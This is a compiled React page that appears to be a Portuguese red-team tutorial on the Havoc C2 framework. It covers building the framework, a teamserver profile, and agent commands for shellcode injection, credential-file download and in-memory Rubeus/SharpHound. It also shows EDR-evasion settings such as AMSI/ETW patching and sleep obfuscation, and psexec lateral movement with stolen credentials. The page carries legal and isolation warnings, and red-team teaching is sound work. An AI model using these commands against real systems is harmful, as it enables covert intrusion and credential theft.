import{j as e}from"./index-Bd5otbF3.js";import{P as i}from"./PageContainer-BFcnvssG.js";import{A as a}from"./AlertBox-CL6YULjX.js";import{C as s}from"./CodeBlock-C2J-D4l6.js";import{C as t}from"./CommandTable-BxJEHhQ9.js";import{T as o,P as r}from"./PracticeBox-Pst8IaIf.js";function u(){return e.jsxs(i,{title:"Havoc Framework — C2 moderno focado em evasion",subtitle:"Teamserver em Go + cliente Qt + agente Demon (C/ASM) escrito do zero pensando em bypass de EDR Windows.",difficulty:"avancado",timeToRead:"20 min",children:[e.jsx("h2",{children:"O que é o Havoc"}),e.jsxs("p",{children:[e.jsx("strong",{children:"Havoc"})," (HavocFramework/Havoc, criado por ",e.jsx("strong",{children:"C5pider"}),") é um C2 open-source com foco explícito em evasion contra Defender, Elastic EDR, CrowdStrike e SentinelOne. Diferente do Sliver (escrito 100% em Go), o agente ",e.jsx("strong",{children:"Demon"}),' é em C puro com helpers em assembly — superfície menor, comportamento mais próximo de malware "real", Sleep Obfuscation Ekko/FOLIAGE built-in.']}),e.jsx(a,{type:"warning",title:"Red team / pesquisa apenas",children:e.jsx("p",{children:"Havoc é literalmente RAT projetado pra evadir AV. Possuir sem contrato de pentest = problema jurídico. Mantenha em VM isolada, nunca exponha teamserver direto na internet sem redirector + auth."})}),e.jsx("h2",{children:"Build a partir do source"}),e.jsx(o,{path:"~",lines:[{cmd:"sudo apt install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mingw-w64 nasm qtbase5-dev libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go python3-dev libpython3-dev",out:"(instalação extensa — Havoc é exigente em deps)",outType:"muted"},{cmd:"git clone https://github.com/HavocFramework/Havoc.git ~/Havoc",out:`Cloning into '/home/ana/Havoc'...
remote: Counting objects: 4827, done.
Receiving objects: 100% (4827/4827), 32.41 MiB | 8.12 MiB/s, done.`,outType:"info"},{cmd:"cd ~/Havoc && make ts-build",out:`[*] building teamserver
go build -o havoc ./teamserver/cmd/server
[+] teamserver built successfully`,outType:"success"},{cmd:"cd ~/Havoc && make client-build",out:`[*] building Havoc client
qmake Havoc.pro
make -j$(nproc)
[+] client built: ./havoc`,outType:"success"}]}),e.jsx("h2",{children:"Configurar profile do teamserver"}),e.jsx(s,{language:"json",title:"~/Havoc/profiles/havoc.yaotl",code:`Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm       = "/usr/bin/nasm"
    }
}

Operators {
    user "ana" {
        Password = "T3amS3rverPass!2026"
    }
    user "jsmith" {
        Password = "An0therStrongP@ss"
    }
}

Demon {
    Sleep         = 5
    Jitter        = 25

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\\\Windows\\\\System32\\\\notepad.exe"
        Spawn86 = "C:\\\\Windows\\\\SysWOW64\\\\notepad.exe"
    }
}

Listeners {
    Http {
        Name     = "Listener-HTTPS"
        Hosts    = [ "c2.empresa-redteam.com" ]
        HostBind = "0.0.0.0"
        PortBind = 443
        PortConn = 443
        Secure   = true
        Method   = "POST"
        Uris     = [ "/api/v1/track", "/cdn/assets", "/login/check" ]
        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
}`}),e.jsx("h2",{children:"Subir o teamserver"}),e.jsx(o,{path:"~/Havoc",lines:[{cmd:"sudo ./havoc server --profile ./profiles/havoc.yaotl -v",out:`      ┐ ┬ ┬ ┐ ┐ ┌ ┌
      Havoc Framework
      [*] Starting Havoc Teamserver
      [+] Loaded operator: ana
      [+] Loaded operator: jsmith
      [+] Started Listener: Listener-HTTPS [https://0.0.0.0:443]
      [+] Teamserver started on 0.0.0.0:40056`,outType:"success"}]}),e.jsx("h2",{children:"Conectar com o cliente"}),e.jsx(o,{path:"~/Havoc",lines:[{cmd:"./havoc client",out:`[Havoc client GUI abre]
Endpoint:  127.0.0.1:40056
User:      ana
Password:  ********`,outType:"info"},{comment:"depois de logar, o painel mostra: Listeners | Sessions | Payloads | Loot",cmd:"(no menu) Attack > Payload > Demon",out:`Listener: Listener-HTTPS
Arch: x64
Format: Windows Exe
Sleep Technique: Ekko
Indirect Syscall: ✔
Stack Duplication: ✔
=> output: demon-https-x64.exe`,outType:"warning"}]}),e.jsx("h2",{children:"Comandos do Demon (agent)"}),e.jsx(t,{title:"Comandos essenciais dentro de uma session Demon",variations:[{cmd:"checkin",desc:"Força checkin imediato.",output:"[+] beacon checked in"},{cmd:"sleep 30 50",desc:"Sleep 30s + jitter 50%.",output:"Aumenta intervalo p/ baixar volume."},{cmd:"shell whoami /all",desc:"Spawn cmd.exe /c (cuidado com EDR).",output:"Use proc list-only quando possível."},{cmd:"powershell -i Get-Process",desc:"PowerShell inline (sem dropar .ps1).",output:"Usa System.Management.Automation diretamente."},{cmd:"inline-execute SharpHound.exe -- -c All",desc:"Executa BOF/.NET assembly em memória.",output:"Equivalente a execute-assembly do CS."},{cmd:"dotnet-inline /opt/Rubeus.exe kerberoast",desc:"Carrega CLR e roda assembly.",output:"Sem tocar disco."},{cmd:"screenshot",desc:"Print da tela.",output:"Saved to /Loot/screenshots/"},{cmd:"upload /tmp/payload.dll C:\\\\Windows\\\\Temp\\\\evil.dll",desc:"Upload via canal C2.",output:"Multipart binary upload."},{cmd:"download C:\\\\Users\\\\Admin\\\\Desktop\\\\creds.kdbx",desc:"Download arquivo p/ teamserver.",output:"Salva em /Loot/<session>/"},{cmd:"spawn x64 /opt/payload.bin",desc:"Spawn novo demon a partir de shellcode.",output:"Útil pra migrar de processo morto."},{cmd:"proc list",desc:"Lista processos remotos.",output:"PID | PPID | Arch | User | Process"},{cmd:"proc inject 4188 /tmp/sc.bin",desc:"Injeta shellcode em PID 4188.",output:"Indirect syscall por padrão."},{cmd:"socks add 1080",desc:"SOCKS5 local na porta 1080 que sai via demon.",output:"Pivoting interno."}]}),e.jsx("h2",{children:"Sleep obfuscation — diferencial do Havoc"}),e.jsxs("p",{children:['Quando um beacon está "dormindo", a memória dele fica visível pra scanners de EDR. O Havoc implementa ',e.jsx("strong",{children:"Ekko"})," e ",e.jsx("strong",{children:"FOLIAGE"})," nativos: durante o sleep, o agente se criptografa em memória, troca permissões RX→RW→RX e resseta thread state usando timers e ROP. Reduz drasticamente a chance de scanner achar o stub no descanso."]}),e.jsx(o,{path:"~",lines:[{cmd:"(Demon) > sleep 60 35",out:`[+] sleep 60s, jitter 35%, technique = Ekko (configured no profile)
[+] beacon entering encrypted sleep ... (memory wiped)`,outType:"warning"},{comment:"comparação rápida no Process Hacker do alvo",cmd:"(no alvo) inspecionar memória do PID do demon durante sleep",out:"(regiões RWX viram noise/criptografadas; assinaturas YARA não batem)",outType:"muted"}]}),e.jsx("h2",{children:"Indirect syscalls + stack spoofing"}),e.jsx(s,{language:"json",title:"trecho extra do profile habilitando evasion",code:`Demon {
    Injection {
        Spawn64 = "C:\\\\Windows\\\\System32\\\\notepad.exe"
        Spawn86 = "C:\\\\Windows\\\\SysWOW64\\\\notepad.exe"
    }

    SleepTechnique         = "Ekko"
    AmsiEtwPatch           = true
    IndirectSyscall        = true
    StackDuplication       = true
    ProxyLoading           = "RtlRegisterWait"
    Sleep                  = 60
    Jitter                 = 35
}`}),e.jsxs("p",{children:[e.jsx("strong",{children:"Indirect syscall"})," resolve ",e.jsx("code",{children:"ntdll!Nt*"})," dinamicamente e chama via SSN, evitando hooks userland. ",e.jsx("strong",{children:"Stack duplication"})," esconde a call stack do thread durante syscalls sensíveis (ex: ",e.jsx("code",{children:"NtCreateThreadEx"}),") — EDRs como CrowdStrike olham stack walking pra detectar injection."]}),e.jsx("h2",{children:"Lateral movement"}),e.jsx(o,{path:"~",lines:[{cmd:"(Demon) > pivot smb \\\\\\\\WS-USR07\\\\pipe\\\\havoc_pipe",out:`[+] Spawning SMB Demon on pipe \\\\WS-USR07\\pipe\\havoc_pipe
[+] generated payload: pipe-demon.bin (148592 bytes)
[+] use 'jump' to deploy via WMI/SCM`,outType:"info"},{cmd:"(Demon) > jump psexec WS-USR07 svc-backup s3rv1ce_p4ss pipe-demon.bin",out:`[+] Connecting to \\\\WS-USR07 as ACME\\svc-backup ...
[+] Service 'havocsvc' created
[+] Service started, awaiting checkin via SMB pipe
[+] new SMB session: WS-USR07 (ACME\\svc-backup)`,outType:"success"},{comment:"agora o teamserver tem 2 sessions: HTTPS direta + SMB child via pivot",cmd:"(menu) Sessions",out:`ID  Listener         Internal    User              Arch  Last
1   Listener-HTTPS   10.10.14.7    ACME\\jsmith        x64   2s
2   SMB-pivot via 1  10.10.14.41   ACME\\svc-backup    x64   1s`,outType:"default"}]}),e.jsx("h2",{children:"Loot e logging"}),e.jsx(o,{path:"~/Havoc/data/loot",lines:[{cmd:"tree -L 3",out:`.
├── b2c4-4f3a-...
│   ├── downloads
│   │   └── creds.kdbx
│   ├── screenshots
│   │   └── 1759601112.png
│   └── credentials.txt
└── e1f8-2a9b-...
    └── downloads
        └── ntds.dit`,outType:"info"},{cmd:"cat ~/Havoc/data/server.log | tail -10",out:`2026/04/03 14:51:13 [INF] new session: WS-USR07 (mTLS)
2026/04/03 14:53:01 [INF] task ID 3a1c sent: dir
2026/04/03 14:53:04 [INF] task ID 3a1c response: 84 lines
2026/04/03 14:54:11 [WRN] sleep changed: 60s ± 35%`,outType:"muted"}]}),e.jsx("h2",{children:"Comparação rápida com Sliver e Cobalt Strike"}),e.jsx(t,{title:"C2 moderno: Havoc x Sliver x CS",variations:[{cmd:"Custo",desc:"Havoc = grátis. Sliver = grátis. CS = USD 5.9k/operador/ano.",output:"Havoc/Sliver disputam o open-source."},{cmd:"Stealth Windows",desc:"Havoc nasce focado em evasion (Ekko, syscalls).",output:"Sliver evolui mas é mais ruidoso default."},{cmd:"Stealth Linux/macOS",desc:"Sliver suporta os 3 OS. Havoc só Windows.",output:"Demon não tem variante Linux."},{cmd:"BOFs / .NET inline",desc:"Havoc OK, Sliver OK via armory, CS é referência.",output:"BOF compatibility quase universal."},{cmd:"DNS / WireGuard",desc:"Sliver tem nativo. Havoc só HTTP(S)/SMB.",output:"Atravessar firewalls bloqueando 443? Sliver."},{cmd:"Maturidade",desc:"CS > Sliver > Havoc (Havoc ainda em desenvolvimento ativo).",output:"Havoc bugs ocasionais com builds."}]}),e.jsx(r,{title:"Subir Havoc local e gerar Demon de teste",goal:"Build do framework + teamserver + payload x64 (sem rodar payload — só validar build chain).",steps:["Instale as dependências MingW + Qt5 + Go.","Clone o repo HavocFramework/Havoc.","Rode `make ts-build` e `make client-build`.","Edite o profile pra ouvir só em 127.0.0.1.","Suba `./havoc server --profile ...` em um terminal.","Em outro terminal abra `./havoc client` e gere um Demon x64 EXE (não execute no host real)."],command:`git clone https://github.com/HavocFramework/Havoc.git ~/Havoc
cd ~/Havoc
make ts-build && make client-build
sed -i 's/0.0.0.0/127.0.0.1/g' profiles/havoc.yaotl
sudo ./havoc server --profile ./profiles/havoc.yaotl -v
# em outro terminal:
./havoc client
# (logar com user do profile e gerar payload pelo menu)`,expected:`[+] Teamserver started on 127.0.0.1:40056
[+] Loaded operator: ana
[+] Started Listener: Listener-HTTPS [https://127.0.0.1:443]

(client) Payload gerado: data/payloads/demon-x64.exe (146432 bytes)`,verify:"O arquivo demon-x64.exe deve existir em data/payloads/. Não execute no host real — copie pra VM Windows isolada."}),e.jsx(a,{type:"danger",title:"Não use Havoc no host Kali ou em produção",children:e.jsx("p",{children:"Os binários gerados são detectados por Defender com profile default — mas ainda assim são malware funcional. Mantenha em VMs sem rede ou em laboratório isolado. Nunca commit payloads em git público (alguns scanners vão derrubar seu repo e flagar sua conta)."})})]})}export{u as default};
